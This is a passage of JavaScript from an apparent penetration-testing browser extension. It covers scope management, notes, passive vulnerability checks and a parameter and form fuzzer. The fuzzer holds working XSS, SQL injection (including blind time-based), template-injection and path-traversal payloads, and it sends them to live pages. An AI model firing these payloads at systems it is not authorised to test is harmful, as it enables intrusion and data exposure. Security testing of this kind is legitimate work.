    b.querySelector('#sc-a')?.addEventListener('click',()=>{const v=b.querySelector('#sc-i').value.trim();if(v&&!scopeDomains.includes(v)){scopeDomains.push(v);chrome.storage.local.set({scopeDomains});updateScopeIndicator();render()}});
    b.querySelector('#sc-ac')?.addEventListener('click',()=>{const r=getRootDomain(activeTabDomain);if(r&&!scopeDomains.includes(r)){scopeDomains.push(r);chrome.storage.local.set({scopeDomains});updateScopeIndicator();render()}});
    b.querySelectorAll('.remove-scope').forEach(x=>x.addEventListener('click',()=>{scopeDomains.splice(+x.dataset.idx,1);chrome.storage.local.set({scopeDomains});updateScopeIndicator();render()}));
  };
  render();
}

function toolNotes() {
  const b = showResults('scope','Notes',false);
  const key = getRootDomain(activeTabDomain)||'global';
  b.innerHTML=`<textarea class="notes-editor" id="nt" placeholder="Notes for ${key}…">${esc(notes[key]||'')}</textarea><div class="tool-input-row mt-6"><button class="btn-sm primary" id="ns">Save</button><button class="btn-sm" id="nc">Copy</button><button class="btn-sm" id="ne">Export</button></div>`;
  b.querySelector('#ns')?.addEventListener('click',()=>{notes[key]=b.querySelector('#nt').value;chrome.storage.local.set({notes});log('Saved: '+key,'success')});
  b.querySelector('#nc')?.addEventListener('click',()=>copyText(b.querySelector('#nt').value));
  b.querySelector('#ne')?.addEventListener('click',()=>downloadText(b.querySelector('#nt').value,'cyboware-notes-'+key+'.txt'));
}

// ═══ BROWSE HISTORY ═══
function toolHistory() {
  const b = showResults('workflow','Browse History',false);
  const root = getRootDomain(activeTabDomain);
  const entries = browseHistory[root] || [];
  if (!entries.length) {
    b.innerHTML = `<div class="text-muted text-sm">No history yet for ${esc(root||'this domain')}.</div><div class="text-xs text-muted mt-4">History auto-records when a domain is in your Scope.</div>`;
    return;
  }
  const sorted = [...entries].sort((a,c) => c.timestamp - a.timestamp);
  b.innerHTML = `<div class="flex-between mb-6"><span class="text-sm">${sorted.length} URLs for ${esc(root)}</span><button class="btn-sm" id="bh-copy">Copy All</button></div><div class="tool-input-row"><button class="btn-sm" id="bh-clear">Clear History</button><button class="btn-sm" id="bh-json">Export JSON</button></div><div class="mt-6">${sorted.map(e => {
    const d = new Date(e.timestamp);
    return `<div class="result-item info"><div class="result-label">${d.toLocaleTimeString()} ${d.toLocaleDateString()}</div><div class="result-value">${esc(e.url)}</div><div class="text-xs text-muted">${esc(e.title)}</div></div>`;
  }).join('')}</div>`;
  b.querySelector('#bh-copy')?.addEventListener('click',()=>copyText(sorted.map(e=>e.url).join('\n')));
  b.querySelector('#bh-json')?.addEventListener('click',()=>copyText(JSON.stringify(sorted,null,2)));
  b.querySelector('#bh-clear')?.addEventListener('click',()=>{delete browseHistory[root];chrome.storage.local.set({browseHistory});toolHistory()});
}

async function toolScreenshot() {
  const b = showResults('workflow','Screenshot',true);
  const res = await chrome.runtime.sendMessage({ type: 'TAKE_SCREENSHOT' });
  if (!res.ok) { b.innerHTML = errMsg(res.error); return; }
  b.innerHTML=`<img src="${res.dataUrl}" style="max-width:100%;border:1px solid var(--border);border-radius:var(--radius)"><div class="tool-input-row mt-6"><button class="btn-sm primary" id="ss-dl">Download</button></div>`;
  b.querySelector('#ss-dl')?.addEventListener('click',()=>{const a=document.createElement('a');a.href=res.dataUrl;a.download=`cyboware-${activeTabDomain}-${Date.now()}.png`;a.click()});
  finalizeResults('workflow');
}

async function toolPassive() {
  const b = showResults('discovery','Vuln Hints',true);
  const r = await msgTab({ type: 'CHECK_PASSIVE_VULNS' });
  const f = r?.data||[];

  // Additional checks from sidepanel
  // CSRF: check forms
  try {
    const formRes = await msgTab({ type: 'EXTRACT_FORMS' });
    (formRes?.data || []).forEach(form => {
      if (form.method?.toLowerCase() === 'post' || !form.method) {
        const hasCSRF = form.fields.some(fi => /csrf|_token|authenticity_token|__RequestVerification|_xsrf/i.test(fi.name));
        if (!hasCSRF && form.fields.length > 0) {
          f.push({ severity: 'high', type: 'Missing CSRF Token', detail: `POST form (${form.fields.length} fields) → ${form.action || '(self)'} — no CSRF protection detected` });
        }
      }
      // Autocomplete on sensitive fields
      form.fields.forEach(fi => {
        if (['password','credit-card','cc-number','cvv','ssn'].includes(fi.type) || /password|card|cvv|ssn|credit/i.test(fi.name)) {
          if (fi.autocomplete !== 'off') f.push({ severity: 'low', type: 'Autocomplete Enabled', detail: `Field "${fi.name}" (${fi.type}) allows autocomplete — PCI concern` });
        }
      });
    });
  } catch {}

  // Clickjacking: check headers
  try {
    const hRes = await chrome.runtime.sendMessage({ type: 'GET_HEADERS', tabId: activeTabId });
    if (hRes.headers) {
      const hd = {}; hRes.headers.responseHeaders.forEach(h => { hd[h.name.toLowerCase()] = h.value; });
      if (!hd['x-frame-options'] && !(hd['content-security-policy']||'').includes('frame-ancestors')) {
        f.push({ severity: 'medium', type: 'Clickjacking', detail: 'No X-Frame-Options or CSP frame-ancestors — page can be embedded in iframe' });
      }
      // Sensitive data in URL params
      const u = new URL(activeTabUrl);
      u.searchParams.forEach((v, k) => {
        if (/password|token|secret|key|ssn|credit|auth/i.test(k)) {
          f.push({ severity: 'medium', type: 'Sensitive URL Param', detail: `"${k}" in URL — leaks via Referer header and browser history` });
        }
      });
    }
  } catch {}

  if(f.length){const bd=document.getElementById('badge-discovery');bd.textContent=f.length;bd.classList.remove('hidden')}
  b.innerHTML = `<div class="text-xs text-muted mb-4">Page: ${esc(activeTabUrl)}</div>` +
    (f.length===0 ? '<div class="text-muted text-sm">No passive findings</div>' :
    f.map(x=>`<div class="result-item ${x.severity}" style="cursor:pointer"><div class="result-label"><span class="result-tag tag-${x.severity}">${x.severity}</span>${esc(x.type)}</div><div class="result-value">${esc(x.detail)}</div></div>`).join(''));
  finalizeResults('discovery');
}

async function toolWayback() {
  const b = showResults('recon','Wayback',true);
  b.innerHTML='<div class="loading-text"><span class="spinner"></span> Querying…</div>';
  const r = await chrome.runtime.sendMessage({ type: 'WAYBACK_LOOKUP', url: activeTabUrl });
  if(!r.ok){b.innerHTML=errMsg(r.error);return}
  b.innerHTML=!r.snapshots.length?'<div class="text-muted text-sm">No snapshots</div>':`<div class="text-sm mb-6">${r.snapshots.length} snapshots</div>`+r.snapshots.map(s=>{const d=s[0].slice(0,4)+'-'+s[0].slice(4,6)+'-'+s[0].slice(6,8);return`<div class="result-item info"><a href="https://web.archive.org/web/${s[0]}/${s[1]}" target="_blank" style="color:var(--accent);text-decoration:none"><div class="result-label">${d}</div><div class="result-value">${esc(s[1]).slice(0,60)} (${s[2]})</div></a></div>`}).join('');
  finalizeResults('discovery');
}

function toolDiff() {
  const b = showResults('utility','Diff',false);
  b.innerHTML=`<div class="text-sm mb-6">Fetch same URL with different headers</div><div class="tool-input-row"><input class="tool-input" id="df-u" value="${esc(activeTabUrl)}"></div><textarea class="tool-input mb-6" id="df-h" rows="2" placeholder='{"Cookie":"a=1"}'>{}</textarea><div class="tool-input-row mb-6"><button class="btn-sm primary" id="df-a">→ A</button><button class="btn-sm primary" id="df-b">→ B</button><button class="btn-sm success" id="df-c" ${!diffStore.a||!diffStore.b?'disabled':''}>Compare</button></div><div class="text-xs mb-6">A: ${diffStore.a?'✓ '+diffStore.a.status:'—'} | B: ${diffStore.b?'✓ '+diffStore.b.status:'—'}</div><pre class="result-value" id="df-o" style="max-height:250px;overflow:auto;white-space:pre-wrap;font-size:10px"></pre>`;
  const fetch_ = async s=>{let h={};try{h=JSON.parse(b.querySelector('#df-h').value)}catch{};const r=await chrome.runtime.sendMessage({type:'FETCH_URL',url:b.querySelector('#df-u').value,headers:h});diffStore[s]={text:r.text||'',status:r.status};toolDiff()};
  b.querySelector('#df-a')?.addEventListener('click',()=>fetch_('a'));
  b.querySelector('#df-b')?.addEventListener('click',()=>fetch_('b'));
  b.querySelector('#df-c')?.addEventListener('click',()=>{if(!diffStore.a||!diffStore.b)return;const la=diffStore.a.text.split('\n'),lb=diffStore.b.text.split('\n');let d=`--- A (${diffStore.a.status})\n+++ B (${diffStore.b.status})\n\n`,n=0;for(let i=0;i<Math.max(la.length,lb.length);i++){if((la[i]||'')!==(lb[i]||'')){d+=`@@ ${i+1} @@\n- ${la[i]||''}\n+ ${lb[i]||''}\n`;n++;if(n>100){d+='\n[truncated]';break}}}if(!n)d+='(No differences)';b.querySelector('#df-o').textContent=d});
}

// ═══ PARAMETER FUZZER ═══
const CAPTCHA_FIELDS = /^(captcha|altcha|recaptcha|g-recaptcha|h-captcha|hcaptcha|cf-turnstile|__cf_chl|captcha_token|captcha_response|captchaAnswer)/i;
const CSRF_FIELDS = /^(_csrf|csrf|csrftoken|csrf_token|authenticity_token|__RequestVerificationToken|_xsrf|_token|antiforgery|__VIEWSTATE|__EVENTVALIDATION)/i;

async function toolParamFuzz() {
  const b = showResults('offensive', 'Param Fuzzer', false);
  const u = new URL(activeTabUrl);
  const params = [...u.searchParams.keys()];
  let pageForms = [];

  const refreshForms = async () => {
    try { const fr = await msgTab({ type: 'EXTRACT_FORMS' }); if (fr?.ok) pageForms = fr.data.filter(f => f.fields.length > 0); } catch {}
    return pageForms;
  };
  await refreshForms();
  const countFields = () => pageForms.reduce((s, f) => s + f.fields.filter(fi => fi.name && fi.type !== 'submit' && fi.type !== 'button').length, 0);

  b.innerHTML = '<div class="codec-row mb-4" style="border-bottom:1px solid var(--border);padding-bottom:8px"><button class="btn-sm ' + (params.length ? 'primary' : '') + '" id="fz-mode-url" style="font-weight:700">URL Params (' + params.length + ')</button><button class="btn-sm" id="fz-mode-form" style="font-weight:700">Form Fields (<span id="fz-form-count">' + countFields() + '</span>)</button></div><div id="fz-mode-content"></div>';

  // ═══ URL PARAMS MODE ═══
  // Helper: parse URL params from any URL string
  const parseUrlParams = (urlStr) => {
    try {
      let u;
      try { u = new URL(urlStr); } catch { u = new URL('https://' + urlStr); }
      return [...u.searchParams.entries()].map(([k, v]) => ({ name: k, value: v }));
    } catch { return []; }
  };

  const renderUrlMode = () => {
    const mc = b.querySelector('#fz-mode-content');
    mc.innerHTML = '<div class="tool-input-row"><input class="tool-input" id="fz-url" value="' + esc(activeTabUrl) + '" placeholder="Paste any URL with params to fuzz" style="font-size:10px"></div><div id="fz-param-area"></div><div class="codec-row mb-4"><button class="btn-sm primary" data-fzcat="xss">XSS</button><button class="btn-sm" data-fzcat="sqli">SQLi + Blind</button><button class="btn-sm" data-fzcat="ssti">SSTI</button><button class="btn-sm" data-fzcat="path">Path Traversal</button></div><details style="margin-bottom:8px"><summary class="text-xs text-muted" style="cursor:pointer">Custom payloads</summary><textarea class="tool-input mt-4" id="fz-custom" rows="3" placeholder="One payload per line"></textarea></details><div id="fz-out"></div>';

    // Render param checkboxes from URL
    const renderParamCheckboxes = (urlStr) => {
      const area = mc.querySelector('#fz-param-area');
      const parsed = parseUrlParams(urlStr);
      if (!parsed.length) {
        area.innerHTML = '<div class="text-sm mb-6" style="color:var(--warning)">No URL params detected. Add ?param=value to the URL.</div>';
        return;
      }
      area.innerHTML = '<div class="text-xs text-muted mb-4">Select params to fuzz (' + parsed.length + ' detected):</div><div style="display:flex;flex-wrap:wrap;gap:4px;margin-bottom:6px">' +
        parsed.map(p => '<label style="display:inline-flex;align-items:center;gap:3px;padding:3px 8px;background:var(--surface);border:1px solid var(--border);border-radius:4px;font-size:9px;font-family:var(--font-mono);cursor:pointer"><input type="checkbox" data-param-cb="' + esc(p.name) + '" checked style="margin:0;width:12px;height:12px"><strong>' + esc(p.name) + '</strong>' + (p.value ? '<span style="color:var(--text-tertiary)">=' + esc(p.value.slice(0, 20)) + '</span>' : '<span style="color:var(--warning)">(empty)</span>') + '</label>').join('') +
        '</div><div style="margin-bottom:8px"><button class="btn-sm" id="fz-psel-all" style="font-size:8px;padding:2px 6px">All</button> <button class="btn-sm" id="fz-psel-none" style="font-size:8px;padding:2px 6px">None</button></div>';
      area.querySelector('#fz-psel-all')?.addEventListener('click', () => area.querySelectorAll('[data-param-cb]').forEach(cb => cb.checked = true));
      area.querySelector('#fz-psel-none')?.addEventListener('click', () => area.querySelectorAll('[data-param-cb]').forEach(cb => cb.checked = false));
    };

    // Initial render
    renderParamCheckboxes(mc.querySelector('#fz-url').value);

    // Dynamic re-parse on URL change (paste, type, etc.)
    let parseTimer;
    mc.querySelector('#fz-url').addEventListener('input', (e) => {
      clearTimeout(parseTimer);
      parseTimer = setTimeout(() => renderParamCheckboxes(e.target.value), 300);
    });

    mc.querySelectorAll('[data-fzcat]').forEach(btn => btn.addEventListener('click', async () => {
      const out = mc.querySelector('#fz-out');
      const url = mc.querySelector('#fz-url').value;
      const cat = btn.dataset.fzcat;
      const selectedParams = [...mc.querySelectorAll('[data-param-cb]:checked')].map(cb => cb.dataset.paramCb);
      if (!selectedParams.length) { out.innerHTML = '<div class="text-muted text-sm">No params selected</div>'; return; }
      const customPayloads = (mc.querySelector('#fz-custom')?.value || '').split('\n').map(s => s.trim()).filter(Boolean);
      out.innerHTML = '<div class="loading-text"><span class="spinner"></span> Fuzzing ' + cat.toUpperCase() + ' on ' + selectedParams.length + ' param(s)...</div><div style="height:3px;background:var(--border);border-radius:2px;margin-top:8px;overflow:hidden"><div style="height:100%;width:30%;background:var(--accent);animation:fz-pulse 2s ease-in-out infinite"></div></div>';
      const r = await chrome.runtime.sendMessage({ type: 'PARAM_FUZZ', url, category: cat, customPayloads, selectedParams });
      if (!r.ok) { out.innerHTML = errMsg(r.error); return; }
      if (r.message) { out.innerHTML = '<div class="text-muted text-sm">' + esc(r.message) + '</div>'; return; }
      renderFuzzResults(out, r, 'url');
      finalizeResults('offensive');
    }));
  };

  // ═══ FORM FIELDS MODE ═══
  const renderFormMode = async () => {
    const mc = b.querySelector('#fz-mode-content');
    mc.innerHTML = '<div class="loading-text"><span class="spinner"></span> Scanning forms...</div>';
    await refreshForms();
    const fc = b.querySelector('#fz-form-count');
    if (fc) fc.textContent = countFields();

    if (!pageForms.length) {
      mc.innerHTML = '<div class="text-muted text-sm" style="padding:8px 0">No forms detected.</div><div class="text-xs text-muted mb-6">Navigate to a page with forms. Dynamic forms appear after re-scan.</div><button class="btn-sm" id="fz-rescan">Re-scan Page</button>';
      mc.querySelector('#fz-rescan')?.addEventListener('click', () => renderFormMode());
      return;
    }

    mc.innerHTML = '<div class="flex-between mb-6"><span class="text-sm">' + pageForms.length + ' form(s)</span><button class="btn-sm" id="fz-rescan">Re-scan</button></div><div id="fz-form-list"></div><div id="fz-form-detail" style="display:none;margin-top:10px;padding-top:10px;border-top:1px solid var(--border)"><div class="result-label mb-4" id="fz-form-label">Selected form</div><div class="codec-row mb-4"><button class="btn-sm primary" data-ffcat="xss">XSS</button><button class="btn-sm" data-ffcat="sqli">SQLi + Blind</button><button class="btn-sm" data-ffcat="ssti">SSTI</button><button class="btn-sm" data-ffcat="path">Path Traversal</button></div><div id="fz-form-out"></div></div>';

    const listEl = mc.querySelector('#fz-form-list');
    pageForms.forEach((f, i) => {
      const allF = f.fields.filter(fi => fi.name);
      const fuzzableF = allF.filter(fi => fi.type !== 'submit' && fi.type !== 'button');
      const hasPassword = allF.some(fi => fi.type === 'password');
      const hasFile = allF.some(fi => fi.type === 'file');
      const hasCaptcha = allF.some(fi => CAPTCHA_FIELDS.test(fi.name));
      const isVirtual = f.isVirtual;
      const label = isVirtual ? (f.virtualLabel || 'Standalone Inputs') : hasPassword ? 'Login Form' : hasFile ? 'File Upload' : 'Form';
      const icon = isVirtual ? '&#128269;' : hasPassword ? '&#128274;' : hasFile ? '&#128193;' : '&#128221;';
      const actionShort = f.action ? (f.action.length > 50 ? '...' + f.action.slice(-40) : f.action) : '(self)';

      const card = document.createElement('div');
      card.className = 'fz-form-card';
      card.dataset.formIdx = i;
      card.style.cssText = 'border:1px solid var(--border);border-radius:var(--radius);margin-bottom:6px;background:var(--surface);overflow:hidden';

      // Header
      let headerHTML = '<div style="display:flex;align-items:center;justify-content:space-between;padding:8px 10px;cursor:pointer"><div style="flex:1;min-width:0"><div style="font-size:11px;font-weight:600">' + icon + ' ' + label + ' <span style="font-weight:400;color:var(--text-secondary);font-family:var(--font-mono);font-size:9.5px">' + esc(f.method?.toUpperCase() || 'GET') + '</span></div><div style="font-size:9.5px;color:var(--text-tertiary);font-family:var(--font-mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">' + esc(actionShort) + '</div></div><div style="display:flex;align-items:center;gap:6px"><span style="font-size:9px;color:var(--text-tertiary)">' + fuzzableF.length + ' fields</span><span class="fz-chev" style="font-size:10px;color:var(--text-tertiary);transition:transform 180ms">&#9654;</span></div></div>';

      // Body with checkboxes
      let bodyHTML = '<div class="fz-form-body" style="display:none;padding:8px 10px 10px;border-top:1px solid var(--border);background:var(--bg)">';
      if (hasCaptcha) {
        bodyHTML += '<div style="padding:4px 8px;margin-bottom:6px;background:var(--warning-soft);border:1px solid var(--warning);border-radius:4px;font-size:9px;color:var(--warning)">&#9888; Captcha detected. Server may reject all submissions. Results show error handling only.</div>';
      }
      bodyHTML += '<div style="margin-bottom:6px"><button class="fz-sel-all btn-sm" style="font-size:8px;padding:1px 5px">All</button> <button class="fz-sel-none btn-sm" style="font-size:8px;padding:1px 5px">None</button> <button class="fz-sel-interesting btn-sm" style="font-size:8px;padding:1px 5px">Interesting</button></div>';
      bodyHTML += '<div style="display:flex;flex-direction:column;gap:3px">';
      fuzzableF.forEach(fi => {
        const isCsrf = CSRF_FIELDS.test(fi.name);
        const isCaptcha = CAPTCHA_FIELDS.test(fi.name);
        const isFrozen = isCsrf || isCaptcha || fi.type === 'hidden';
        const isInteresting = /password|secret|token|auth|key|admin|role|email|user|login|search|query|q\b|name/i.test(fi.name);
        const defaultChecked = !isFrozen && (isInteresting || fi.type === 'text' || fi.type === 'email' || fi.type === 'password' || fi.type === 'search' || fi.type === 'tel' || fi.type === 'url' || !fi.type);

        if (isFrozen) {
          bodyHTML += '<div style="display:flex;align-items:center;gap:4px;padding:2px 6px;background:var(--surface-hover);border:1px dashed var(--border);border-radius:4px;font-size:9px;font-family:var(--font-mono);opacity:0.6">&#128274; <span style="color:var(--text-tertiary)">' + esc(fi.name) + '</span> <span style="color:var(--text-tertiary);font-size:8px">= ' + esc((fi.value || '').slice(0, 25)) + ' (frozen)</span></div>';
        } else {
          bodyHTML += '<label style="display:flex;align-items:center;gap:4px;padding:2px 6px;background:' + (isInteresting ? 'var(--accent-soft)' : 'var(--surface)') + ';border:1px solid ' + (isInteresting ? 'var(--accent)' : 'var(--border)') + ';border-radius:4px;font-size:9px;font-family:var(--font-mono);cursor:pointer"><input type="checkbox" class="fz-field-cb" data-field-name="' + esc(fi.name) + '" ' + (defaultChecked ? 'checked' : '') + ' style="margin:0;width:12px;height:12px">' + (isInteresting ? '&#127919;' : '') + '<strong>' + esc(fi.name) + '</strong> <span style="color:var(--text-tertiary)">' + (fi.type || 'text') + '</span></label>';
        }
      });
      bodyHTML += '</div>';
      bodyHTML += '<button class="btn-sm primary fz-select-form" style="font-size:9px;padding:3px 8px;margin-top:8px">Select for Fuzzing</button></div>';

      card.innerHTML = headerHTML + bodyHTML;
      listEl.appendChild(card);

      // Toggle
      card.querySelector('div[style*="cursor:pointer"]').addEventListener('click', () => {
        const body = card.querySelector('.fz-form-body');
        const chev = card.querySelector('.fz-chev');
        const isOpen = body.style.display !== 'none';
        body.style.display = isOpen ? 'none' : 'block';
        if (chev) chev.style.transform = isOpen ? '' : 'rotate(90deg)';
      });

      // Select all/none/interesting
      card.querySelector('.fz-sel-all')?.addEventListener('click', () => card.querySelectorAll('.fz-field-cb').forEach(cb => cb.checked = true));
      card.querySelector('.fz-sel-none')?.addEventListener('click', () => card.querySelectorAll('.fz-field-cb').forEach(cb => cb.checked = false));
      card.querySelector('.fz-sel-interesting')?.addEventListener('click', () => {
        card.querySelectorAll('.fz-field-cb').forEach(cb => {
          cb.checked = /password|secret|token|auth|key|admin|role|email|user|login|search|query|name/i.test(cb.dataset.fieldName);
        });
      });

      // Select for fuzzing
      card.querySelector('.fz-select-form')?.addEventListener('click', () => {
        const det = mc.querySelector('#fz-form-detail');
        det.style.display = 'block';
        det.dataset.formIdx = i;
        mc.querySelector('#fz-form-label').textContent = 'Fuzzing: ' + (f.method?.toUpperCase() || 'GET') + ' \u2192 ' + (f.action || '(self)');
        listEl.querySelectorAll('.fz-form-card').forEach(c => c.style.borderColor = 'var(--border)');
        card.style.borderColor = 'var(--accent)';
        det.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
      });
    });

    mc.querySelector('#fz-rescan')?.addEventListener('click', () => renderFormMode());

    // Fuzz buttons
    mc.querySelectorAll('[data-ffcat]').forEach(btn => btn.addEventListener('click', async () => {
      const det = mc.querySelector('#fz-form-detail');
      const formIdx = +det.dataset.formIdx;
      if (isNaN(formIdx) || formIdx < 0) { alert('Select a form first'); return; }
      const f = pageForms[formIdx];
      const cat = btn.dataset.ffcat;
      const out = mc.querySelector('#fz-form-out');
      const card = listEl.querySelector('[data-form-idx="' + formIdx + '"]');
      const selectedFields = card ? [...card.querySelectorAll('.fz-field-cb:checked')].map(cb => cb.dataset.fieldName) : [];
      if (!selectedFields.length) { out.innerHTML = '<div class="text-muted text-sm">No fields selected. Check at least one field above.</div>'; return; }
      out.innerHTML = '<div class="loading-text"><span class="spinner"></span> Fuzzing ' + selectedFields.length + ' field(s) with ' + cat.toUpperCase() + (cat === 'sqli' ? ' (includes blind timing)' : '') + '...</div><div style="height:3px;background:var(--border);border-radius:2px;margin-top:8px;overflow:hidden"><div style="height:100%;width:30%;background:var(--accent);animation:fz-pulse 2s ease-in-out infinite"></div></div>';
      const payloadSets = {
        xss: [
          { p: '<script>alert(1)</script>', check: 'unencoded_html' },
          { p: '"><img src=x onerror=alert(1)>', check: 'unencoded_html' },
          { p: '<svg/onload=alert(1)>', check: 'unencoded_html' },
          { p: 'cyboXSS"onmouseover="alert(1)', check: 'unencoded_attr' },
          { p: '<details open ontoggle=alert(1)>', check: 'unencoded_html' },
        ],
        sqli: [
          { p: "' OR '1'='1", check: 'sqli_error' },
          { p: "' UNION SELECT NULL--", check: 'sqli_error' },
          { p: "' AND extractvalue(1,concat(0x7e,version()))--", check: 'sqli_error' },
          { p: "' OR SLEEP(4)--", check: 'sqli_blind_time' },
          { p: "'; WAITFOR DELAY '0:0:4'--", check: 'sqli_blind_time' },
          { p: "' || pg_sleep(4)--", check: 'sqli_blind_time' },
        ],
        ssti: [
          { p: '{{7777777*3333333}}', check: 'ssti_eval', expect: '25925920740741' },
          { p: '$' + '{9182736+4455667}', check: 'ssti_eval', expect: '13638403' },
        ],
        path: [
          { p: '../../../etc/passwd', check: 'file_content' },
          { p: '....//....//etc/passwd', check: 'file_content' },
        ],
      };
      const allFields = f.fields.filter(fi => fi.name);
      const action = f.action || activeTabUrl;
      const r = await chrome.runtime.sendMessage({
        type: 'FUZZ_FORM', action, method: f.method || 'GET',
        fields: allFields, payloads: payloadSets[cat] || payloadSets.xss, category: cat,
        selectedFields
      });
      if (!r.ok) { out.innerHTML = errMsg(r.error); return; }
      renderFuzzResults(out, r, 'form');
      finalizeResults('offensive');
    }));
  };

  // ═══ EXPANDABLE RESULTS (shared) ═══
  const renderFuzzResults = (out, r, mode) => {
    const critical = r.results.filter(x => x.severity === 'high');
    const warnings = r.results.filter(x => x.severity === 'medium' || x.severity === 'low');
    const fieldKey = mode === 'form' ? 'field' : 'param';
    const safeCount = r.results.filter(x => x.severity === 'safe').length;

    let html = '<div class="flex-between mb-6"><span class="text-sm">' + r.results.length + ' tests' + (r.testedPayloads ? ' (' + r.testedPayloads + '/' + r.totalPayloads + ')' : '') + (r.baselineLen ? ' \u00b7 ' + r.baselineLen + 'b' : '') + (r.baselineTime ? ' \u00b7 ' + (r.baselineTime / 1000).toFixed(1) + 's' : '') + '</span><span class="text-sm"><span class="' + (critical.length ? 'text-accent' : 'text-muted') + '" style="font-weight:700">' + critical.length + ' critical</span>, ' + warnings.length + ' warn</span></div>';
    html += '<div class="codec-row mb-4"><button class="btn-sm fz-filter" data-f="all">All (' + r.results.length + ')</button><button class="btn-sm fz-filter" data-f="vuln">Findings (' + (critical.length + warnings.length) + ')</button><button class="btn-sm fz-filter" data-f="safe">Safe (' + safeCount + ')</button></div>';
    html += '<div id="fz-results-list"></div>';
    out.innerHTML = html;

    const renderList = (filter) => {
      const items = filter === 'vuln' ? r.results.filter(x => x.severity !== 'safe' && x.severity !== 'info') : filter === 'safe' ? r.results.filter(x => x.severity === 'safe') : r.results;
      const listEl = out.querySelector('#fz-results-list');
      listEl.innerHTML = '';
      items.forEach((x, idx) => {
        const sev = x.severity === 'high' ? 'high' : x.severity === 'medium' ? 'medium' : x.severity === 'low' ? 'low' : 'info';
        const tagClass = x.severity === 'high' ? 'tag-high' : x.severity === 'medium' ? 'tag-medium' : x.severity === 'low' ? 'tag-low' : 'tag-safe';
        const tagText = x.severity === 'high' ? 'VULN' : x.severity === 'medium' ? 'WARN' : x.severity === 'low' ? 'NOTE' : 'SAFE';
        const target = x[fieldKey] || x.field || x.param || '?';

        const item = document.createElement('div');
        item.className = 'result-item ' + sev;
        item.style.cursor = 'pointer';

        // Summary row
        let summaryHTML = '<div class="result-label"><span class="result-tag ' + tagClass + '">' + tagText + '</span> ' + esc(target) + (x.fieldType ? ' <span class="text-muted">[' + esc(x.fieldType) + ']</span>' : '') + '<span style="float:right;font-size:9px;color:var(--text-tertiary)">&#9660;</span></div>';
        summaryHTML += '<div class="result-value" style="margin-bottom:3px">' + esc(x.payload) + '</div>';
        summaryHTML += '<div class="text-xs" style="color:var(--text-secondary)">' + esc(x.analysis) + '</div>';
        if (x.status) summaryHTML += '<div class="text-xs text-muted">HTTP ' + x.status + ' \u00b7 ' + x.bodyLen + 'b' + (x.elapsed ? ' \u00b7 ' + (x.elapsed / 1000).toFixed(1) + 's' : '') + '</div>';

        // Detail drawer (hidden by default)
        let detailHTML = '<div class="fz-detail" style="display:none;margin-top:6px;padding:8px;background:var(--surface);border:1px solid var(--border);border-radius:4px">';
        if (x.context) detailHTML += '<div class="result-label mb-4">Reflection Context</div><pre style="font-size:9px;font-family:var(--font-mono);white-space:pre-wrap;word-break:break-all;max-height:60px;overflow:auto;background:var(--surface-hover);padding:4px 6px;border-radius:3px">' + esc(x.context) + '</pre>';
        if (x.requestBody || x.requestUrl || x.url) {
          detailHTML += '<div class="result-label mt-6 mb-4">Request</div><pre style="font-size:9px;font-family:var(--font-mono);white-space:pre-wrap;word-break:break-all;max-height:80px;overflow:auto;background:var(--surface-hover);padding:4px 6px;border-radius:3px">' + esc(x.requestBody || x.url || '') + '</pre>';
        }
        if (x.responsePreview) {
          detailHTML += '<div class="result-label mt-6 mb-4">Response (first 600b)</div><pre style="font-size:9px;font-family:var(--font-mono);white-space:pre-wrap;word-break:break-all;max-height:120px;overflow:auto;background:var(--surface-hover);padding:4px 6px;border-radius:3px">' + esc(x.responsePreview) + '</pre>';
        }
        if (x.errorBody) {
          detailHTML += '<div class="result-label mt-6 mb-4">Error Response</div><pre style="font-size:9px;font-family:var(--font-mono);white-space:pre-wrap;word-break:break-all;max-height:80px;overflow:auto;background:var(--danger-soft);padding:4px 6px;border-radius:3px">' + esc(x.errorBody) + '</pre>';
        }
        detailHTML += '<div class="tool-input-row mt-6" style="flex-wrap:wrap"><button class="btn-sm fz-copy-curl">Copy cURL</button><button class="btn-sm fz-copy-resp">Copy Response</button><button class="btn-sm fz-copy-url">Copy URL</button></div>';
        detailHTML += '</div>';

        item.innerHTML = summaryHTML + detailHTML;
        listEl.appendChild(item);

        // Toggle detail on click
        item.addEventListener('click', (e) => {
          if (e.target.closest('button')) return;
          const det = item.querySelector('.fz-detail');
          const arrow = item.querySelector('.result-label span[style*="float:right"]');
          const isOpen = det.style.display !== 'none';
          det.style.display = isOpen ? 'none' : 'block';
          if (arrow) arrow.innerHTML = isOpen ? '&#9660;' : '&#9650;';
        });

        // cURL copy
        item.querySelector('.fz-copy-curl')?.addEventListener('click', (e) => {
          e.stopPropagation();
          const url = x.requestUrl || x.url || '';
          let curl = 'curl';
          if (x.requestBody && mode === 'form') {
            curl += " -X POST -d '" + (x.requestBody || '') + "'";
            curl += " '" + (x.requestUrl || action || '') + "'";
          } else {
            curl += " '" + url + "'";
          }
          copyText(curl);
        });
        item.querySelector('.fz-copy-resp')?.addEventListener('click', (e) => { e.stopPropagation(); copyText(x.responsePreview || x.errorBody || ''); });
        item.querySelector('.fz-copy-url')?.addEventListener('click', (e) => { e.stopPropagation(); copyText(x.requestUrl || x.url || ''); });
      });
      if (!items.length) listEl.innerHTML = '<div class="text-muted text-sm">No results in this filter</div>';
    };
    renderList('all');
    out.querySelectorAll('.fz-filter').forEach(btn => btn.addEventListener('click', () => renderList(btn.dataset.f)));
    log('Fuzz: ' + critical.length + ' critical, ' + warnings.length + ' warnings', critical.length ? 'warn' : 'success');
  };

  // Mode switching
  b.querySelector('#fz-mode-url').addEventListener('click', () => {
    b.querySelector('#fz-mode-url').classList.add('primary');
    b.querySelector('#fz-mode-form').classList.remove('primary');
    renderUrlMode();
  });
  b.querySelector('#fz-mode-form').addEventListener('click', () => {
    b.querySelector('#fz-mode-form').classList.add('primary');
    b.querySelector('#fz-mode-url').classList.remove('primary');
    renderFormMode();
  });

  if (params.length) renderUrlMode();
  else if (pageForms.length) { b.querySelector('#fz-mode-form').classList.add('primary'); b.querySelector('#fz-mode-url').classList.remove('primary'); renderFormMode(); }
  else renderUrlMode();
}

// ═══ JS BEAUTIFIER ═══
async function toolJsBeautify() {
  const b = showResults('utility', 'JS Beautifier', false);
  const sr = await msgTab({ type: 'GET_SCRIPT_URLS' });
  const scripts = sr?.ok ? sr.data.external : [];
  b.innerHTML = `<div class="text-sm mb-6">${scripts.length} external JS files</div>
    <select class="tool-select mb-6" id="jb-select" style="font-size:10px">
